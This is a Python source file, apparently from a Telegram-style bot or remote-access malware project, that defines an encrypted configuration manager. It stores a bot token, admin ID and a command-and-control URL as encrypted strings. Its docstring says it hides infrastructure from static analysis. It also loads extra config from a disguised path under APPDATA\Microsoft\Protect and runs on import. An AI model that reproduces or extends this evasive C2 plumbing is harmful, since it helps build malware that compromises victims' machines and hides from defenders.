import os
import json
from typing import Any, Dict, Optional
from core.obfuscation import decrypt_string

class ConfigManager:
    """
    A-06: Encrypted Configuration System.
    
    Centralized manager for all bot settings, including API tokens, 
    C2 addresses, and feature flags. All sensitive strings are stored 
    in an encrypted format and decrypted only at runtime to prevent 
    static analysis from revealing infrastructure details.
    """
    _config: Dict[str, Any] = {}

    @classmethod
    def load(cls):
        """Loads and decrypts configuration from environment, embedded strings, or external file"""
        # 1. Start with embedded configuration (fallback)
        embedded = {
            "BOT_TOKEN": decrypt_string("H1sCGSshKhY7BhsLUVcNCVRZEh9nNDcWKSgaShsIWA0uIzw="),
            "ADMIN_ID": decrypt_string("XhsLUVcNCVRZEh9n"),
            "GLOBAL_CHID": decrypt_string("XhsLUVcNCVRZEh9n"),
            "C2_URL": decrypt_string("BkYMG3R+dgYmFBIdHhcIUhZWAwwmMTlCHwUYVwhL"),
        }
        cls._config.update(embedded)

        # 2. Try loading extra config from external encrypted file
        config_paths = [
            os.path.join(os.getcwd(), "config.dat"),
            os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "config.dat"),
            os.path.join(os.environ.get('APPDATA', ''), "Microsoft", "Protect", "config.dat")
        ]

        for path in config_paths:
            if os.path.exists(path):
                try:
                    with open(path, "r") as f:
                        enc_data = f.read().strip()
                        if enc_data:
                            dec_data = decrypt_string(enc_data)
                            external_config = json.loads(dec_data)
                            cls._config.update(external_config)
                            # print(f"✅ Loaded external config from {path}")
                            break
                except Exception as e:
                    pass

        # 3. Override with environment variables if present
        for key in ["BOT_TOKEN", "ADMIN_ID", "GLOBAL_CHID"]:
            val = os.environ.get(key)
            if val:
                cls._config[key] = val

    @classmethod
    def get(cls, key: str, default: Any = None) -> Any:
        return cls._config.get(key, default)

    @classmethod
    def get_int(cls, key: str, default: int = 0) -> int:
        try:
            return int(cls.get(key, default))
        except:
            return default

# Initialize on import
ConfigManager.load()
